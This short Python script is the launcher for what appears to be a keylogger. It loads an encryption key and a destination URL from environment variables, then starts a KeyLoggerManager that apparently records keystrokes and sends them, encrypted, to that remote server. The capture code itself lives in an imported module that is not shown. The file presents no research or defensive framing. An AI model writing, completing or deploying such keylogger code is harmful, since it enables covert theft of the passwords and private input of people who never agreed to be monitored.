from key_logger_manager import KeyLoggerManager
from os import getenv
from dotenv import load_dotenv


load_dotenv()
encryption_key = getenv("encryption_key")
url = getenv('URL')

manager = KeyLoggerManager(5, encryption_key,['server'] ,url)

if __name__ == '__main__':
    manager.start()